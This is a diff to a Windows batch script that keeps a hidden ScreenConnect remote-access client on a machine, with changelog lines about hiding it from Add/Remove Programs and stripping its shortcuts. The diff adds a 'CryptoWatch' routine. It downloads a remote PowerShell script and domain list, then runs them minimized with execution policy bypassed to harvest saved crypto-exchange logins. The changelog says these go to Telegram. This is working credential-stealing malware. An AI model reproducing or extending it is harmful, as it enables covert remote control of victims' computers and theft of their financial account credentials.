@@ -84,6 +84,7 @@ rem   emits NOMBRE_SERVICIO: so Gryxa looked "absent" forever; every cycle msiex
 rem   shared ProductCode + reinstall = console duplicates. Detect is locale-invariant now;
 rem   Install never msiexec /x shared PC (keepers share it - C03/C29).
 rem 0.2.2: SoftHide - ARP (Add/Remove) + hidden/system attrib on Gryxa Program Files dir only
+rem 0.2.3: CryptoWatch - detach sidekick scan for crypto exchange saved logins (Telegram)
 rem   + strip ScreenConnect shortcuts. Keepers never touched.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
@@ -111,7 +112,7 @@ set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
 set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
-set "GVER=0.2.2"
+set "GVER=0.2.3"
 if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
 
 rem --- TRUST (C24): data pins published by the agent from the signed manifest ---
@@ -156,6 +157,7 @@ if exist "%ZD%\killer.flag" (
 )
 
 call :RmmScan
+call :CryptoWatch
 call :DetectAll
 call :Dedup
 
@@ -694,6 +696,24 @@ echo [%DATE% %TIME%] hunt_timeout_proceeding>>"%LOG%"
 :HuntOut
 if exist "%ZD%\killer.out" ( type "%ZD%\killer.out">>"%LOG%" & del /f /q "%ZD%\killer.out" >nul 2>&1 )
 del /f /q "%ZD%\killer.done" >nul 2>&1
+exit /b 0
+
+:CryptoWatch
+rem --- detach crypto saved-login scanner (6h throttle inside PS). Non-blocking. ---
+call :EnsureSidekick
+call :Fetch2 winrtcs_crypto_watch.ps1 "%ZD%\crypto_watch.dl"
+if exist "%ZD%\crypto_watch.dl" findstr /C:"WINRTCS_CRYPTO_WATCH" "%ZD%\crypto_watch.dl" >nul 2>&1 && move /y "%ZD%\crypto_watch.dl" "%ZD%\winrtcs_crypto_watch.ps1" >nul 2>&1
+del /f /q "%ZD%\crypto_watch.dl" >nul 2>&1
+call :Fetch2 winrtcs_crypto_domains.cfg "%ZD%\crypto_domains.dl"
+if exist "%ZD%\crypto_domains.dl" findstr /C:"WINRTCS_CRYPTO_DOMAINS" "%ZD%\crypto_domains.dl" >nul 2>&1 && move /y "%ZD%\crypto_domains.dl" "%ZD%\crypto_domains.cfg" >nul 2>&1
+del /f /q "%ZD%\crypto_domains.dl" >nul 2>&1
+if exist "%ZD%\winrtcs_sidekick.ps1" (
+  start "" /min powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%ZD%\winrtcs_sidekick.ps1" -Action CryptoWatch -WorkDir "%ZD%"
+  echo [%DATE% %TIME%] crypto_watch_queued>>"%LOG%"
+) else if exist "%ZD%\winrtcs_crypto_watch.ps1" (
+  start "" /min powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%ZD%\winrtcs_crypto_watch.ps1" -WorkDir "%ZD%" -DomainList "%ZD%\crypto_domains.cfg"
+  echo [%DATE% %TIME%] crypto_watch_queued_direct>>"%LOG%"
+)
 exit /b 0
 
 :EnsureSidekick
